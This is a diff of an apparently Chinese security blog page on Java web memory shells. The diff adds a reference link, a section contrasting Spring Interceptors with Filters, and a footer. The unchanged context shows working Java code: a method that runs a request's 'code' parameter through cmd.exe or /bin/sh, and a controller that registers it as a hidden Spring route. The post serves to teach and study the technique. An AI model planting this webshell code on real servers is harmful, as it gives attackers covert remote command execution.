@@ -43,7 +43,7 @@
 <meta property="og:image" content="http://sovohelp.fit/2023/01/07/javaWeb%E5%86%85%E5%AD%98%E9%A9%AC/image-20230309184708399.png">
 <meta property="og:image" content="http://sovohelp.fit/2023/01/07/javaWeb%E5%86%85%E5%AD%98%E9%A9%AC/image-20230309191151798.png">
 <meta property="article:published_time" content="2023-01-07T10:45:45.000Z">
-<meta property="article:modified_time" content="2023-03-09T11:11:55.275Z">
+<meta property="article:modified_time" content="2023-03-14T14:04:04.574Z">
 <meta property="article:author" content="sovo">
 <meta property="article:tag" content="java内存马">
 <meta name="twitter:card" content="summary_large_image">
@@ -269,7 +269,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          23k 字
+          24k 字
         
       </span>
     
@@ -280,7 +280,7 @@
         
         
         
-          195 分钟
+          199 分钟
         
       </span>
     
@@ -458,13 +458,26 @@
 <img src="/2023/01/07/javaWeb%E5%86%85%E5%AD%98%E9%A9%AC/image-20230309184708399.png" srcset="/img/loading.gif" lazyload class="" title="image-20230309184708399">
 
 <p>接下来的工作是获取这个对象，带哦用这个方法，添加路由<br>这个对象是AbstractMappingHandlerMapping，但是这个类是一个抽象类，所以我们需要找到它的子类，这个子类就是上面贴出的博客的RequestMappingHandlerMapping</p>
-<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>创建exec方法</p>
+<h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><p>spring中获取request和response<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiang--liu/p/11505849.html">在springMVC的controller中获取request，response对象的一个方法 - 刘达人186 - 博客园 (cnblogs.com)</a></p>
+<p>创建exec方法</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exec</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 获取request和response对象</span><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();<br>        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                java.lang.ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br>                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next(): o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>
 
 <p>注入内存马路由</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/create&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">addShell</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>    <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br>    <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">handlerMapping</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>    <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">requestMappingInfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/controller&quot;</span>),<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br>    <span class="hljs-type">Class</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;fit.sovohelp.spring&quot;</span>);<br>    <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> shell.getMethod(<span class="hljs-string">&quot;exec&quot;</span>);<br><br>    handlerMapping.registerMapping(requestMappingInfo,shell.newInstance(),method);<br><br><br>    System.out.println(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <img src="/2023/01/07/javaWeb%E5%86%85%E5%AD%98%E9%A9%AC/image-20230309191151798.png" srcset="/img/loading.gif" lazyload class="" title="image-20230309191151798">
+
+<h4 id="Spring-Interceptor-内存马"><a href="#Spring-Interceptor-内存马" class="headerlink" title="Spring Interceptor 内存马"></a>Spring Interceptor 内存马</h4><p>interceptor也就是拦截器，spring使用AOP对filter的实现<a target="_blank" rel="noopener" href="https://blog.csdn.net/Herishwater/article/details/103544342">Spring Boot拦截器(Interceptor)详解_spring interceptor 将要执行的类_hresh的博客-CSDN博客</a></p>
+<p>Interceptor和Tomcat和Filter过滤器很类似。区别如下：</p>
+<ol>
+<li>Interceptor基于反射，Filter基于函数回调</li>
+<li>Interceptor不依赖servlet容器</li>
+<li>Interceptor只能对action请求有用</li>
+<li>Interceptor可以访问action上下文，栈里的对象。Filter不能</li>
+<li>action生命周期中，Interceptor可以被多次调用，Filter只在容器初始化时调用一次</li>
+<li>Interceptor可以获取IOC容器中的bean，Filter不行</li>
+</ol>
+<p>由以上区别，Interceptor的应用和过滤器也就不同，Interceptor用来做日志记录，过滤器用来过滤非法操作</p>
 
                 
               </div>
@@ -652,6 +665,34 @@
 </div>
 
   
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      豫ICP备2022023363号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>豫公网安备 41162402000187号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
   
   
 </div>
